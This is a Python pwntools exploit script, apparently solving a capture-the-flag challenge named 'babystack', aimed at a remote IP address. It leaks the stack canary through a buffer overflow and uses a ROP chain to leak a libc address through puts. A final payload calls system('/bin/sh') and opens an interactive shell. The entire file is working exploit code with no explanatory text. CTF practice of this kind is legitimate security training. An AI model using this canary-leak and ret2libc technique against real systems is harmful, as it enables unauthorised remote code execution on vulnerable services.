#!/usr/bin/env python
from pwn import *

#  sh = process('./babystack')
sh = remote('111.198.29.45',35646) 
context.log_level = 'debug'
elf = ELF('./babystack')
libc = ELF('./libc-2.23.so')

puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']
puts_libc = libc.symbols['puts']
system_libc = libc.symbols['system']
pop_rdi = 0x00400a93
main = 0x00400908
log.info('puts_got ' + hex(puts_got))
log.info('puts_plt ' + hex(puts_plt))
log.info('puts_libc ' + hex(puts_libc))


padding = 'a' * 136

#get_canary
sh.recvuntil('>> ')
sh.sendline('1')
sh.sendline(padding)
sh.recvuntil('>> ')
sh.sendline('2')
sh.recvuntil('a' * 136)
canary = u64(sh.recv()[:8]) - 0xa
log.info('canary ' + hex(canary))


#get_system
def getTarget(target, canary):
    payload = 'a' * (0x90 - 0x8) + p64(canary) + 'b' * 8 + p64(pop_rdi) + p64(target) + p64(puts_plt)
    payload += p64(main)
    sh.recvuntil('>> ')
    sh.sendline('1')
    sleep(0.01)
    sh.sendline(payload)
    sh.recvuntil('>> ')
    sh.sendline('3')
    #  sh.recvuntil('b'*8)
    addr = u64(sh.recv()[:6].ljust(8, '\x00'))
    return addr


sh.sendline('\n')
sh.recv()
puts_addr = getTarget(puts_got, canary)
log.info('puts_addr ' + hex(puts_addr))

#get_offset_system_bin_sh 
offset = puts_addr - puts_libc
system_addr = system_libc + offset 
bin_sh = offset + libc.search("/bin/sh").next()
log.info('system_addr ' + hex(system_addr))
log.info('bin_sh ' + hex(bin_sh))

#fuckup
sh.sendline('\n')
sh.recv()
sh.sendline('1')
payload = 'a' * (0x90 - 0x8) + p64(canary) + 'b' * 8 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
payload += p64(main)
sh.sendline(payload)
sh.recv()
sh.sendline('3')


sh.interactive()
